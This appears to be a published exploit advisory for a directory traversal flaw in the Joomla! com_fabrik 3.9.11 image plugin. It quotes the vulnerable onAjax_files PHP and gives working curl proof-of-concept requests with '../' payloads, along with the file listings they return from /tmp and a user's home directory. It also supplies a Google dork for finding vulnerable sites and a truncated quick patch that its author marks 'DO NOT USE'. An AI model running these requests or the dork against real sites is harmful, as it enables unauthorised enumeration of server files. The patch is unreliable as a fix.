@@ -1,0 +1,65 @@
+# Exploit Title: Joomla! com_fabrik 3.9.11 - Directory Traversal
+#Google Dork: inurl:"index.php?option=com_fabrik"
+#Date: 2020-03-30
+#Exploit Author: qw3rTyTy
+#Vendor Homepage: https://fabrikar.com/
+#Software Link: https://fabrikar.com/downloads
+#Version: 3.9
+#Tested on: Debian/Nginx/Joomla! 3.9.11
+##################################################################
+#Vulnerability details
+##################################################################
+File: fabrik_element/image/image.php
+Func: onAjax_files
+
+   394          public function onAjax_files()
+   395          {
+   396                  $this->loadMeForAjax();
+   397                  $folder = $this->app->input->get('folder', '', 'string');		//!!!Possible to directory-traversal.
+   398
+   399                  if (!strstr($folder, JPATH_SITE))
+   400                  {
+   401                          $folder = JPATH_SITE . '/' . $folder;
+   402                  }
+   403
+   404                  $pathA = JPath::clean($folder);
+   405                  $folder = array();
+   406                  $files = array();
+   407                  $images = array();
+   408                  FabrikWorker::readImages($pathA, "/", $folders, $images, $this->ignoreFolders);
+   409
+   410                  if (!array_key_exists('/', $images))
+   411                  {
+   412                          $images['/'] = array();
+   413                  }
+   414
+   415                  echo json_encode($images['/']);
+   416          }
+##################################################################
+#PoC
+##################################################################
+$> curl -X GET -i "http://127.0.0.1/joomla/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../tmp/"
+
+...snip...
+[{"value":"eila.jpg","text":"eila.jpg","disable":false},{"value":"eilanya.jpg","text":"eilanya.jpg","disable":false},{"value":"topsecret.png","text":"topsecret.png","disable":false}]
+...snip...
+
+$> curl -X GET -i "http://127.0.0.1/joomla/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../home/user123/Pictures/"
+
+...snip...
+[{"value":"Revision2017_Banner.jpg","text":"Revision2017_Banner.jpg","disable":false},{"value":"Screenshot from 2019-02-23 22-43-54.png","text":"Screenshot from 2019-02-23 22-43-54.png","disable":false},{"value":"Screenshot from 2019-03-09 14-59-22.png","text":"Screenshot from 2019-03-09 14-59-22.png","disable":false},{"value":"Screenshot from 2019-03-09 14-59-25.png","text":"Screenshot from 2019-03-09 14-59-25.png","disable":false},{"value":"Screenshot from 2019-03-16 23-17-05.png","text":"Screenshot from 2019-03-16 23-17-05.png","disable":false},{"value":"Screenshot from 2019-03-18 07-30-41.png","text":"Screenshot from 2019-03-18 07-30-41.png","disable":false},{"value":"Screenshot from 2019-03-18 08-23-45.png","text":"Screenshot from 2019-03-18 08-23-45.png","disable":false},{"value":"Screenshot from 2019-04-08 00-09-36.png","text":"Screenshot from 2019-04-08 00-09-36.png","disable":false},{"value":"Screenshot from 2019-04-08 10-34-23.png","text":"Screenshot from 2019-04-08 10-34-23.png","disable":false},{"value":"Screenshot from 2019-04-13 08-23-48.png","text":"Screenshot from 2019-04-13 08-23-48.png","disable":false},{"value":"Screenshot from 2019-05-24 23-14-05.png","text":"Screenshot from 2019-05-24 23-14-05.png","disable":false},{"value":"b.jpg","text":"b.jpg","disable":false},{"value":"by_gh0uli.tumblr.com-8755.png.jpeg","text":"by_gh0uli.tumblr.com-8755.png.jpeg","disable":false},{"value":"max_payne_06.jpg","text":"max_payne_06.jpg","disable":false},{"value":"xxx.jpg","text":"xxx.jpg","disable":false}]
+...snip...
+##################################################################
+#Q&D Patch (DO NOT USE :3)
+##################################################################
+--- ./image.php ---
++++ image_patched.php   ---
+@@ -394,7 +394,7 @@
+        public function onAjax_files()
+        {
+                $this->loadMeForAjax();
+-               $folder = $this->app->input->get('folder', '', 'string');
++               $folder = $this->app->input->get('folder', '', 'cmd');
+ 
+                if (!strstr($folder, JPATH_SITE))
+                {
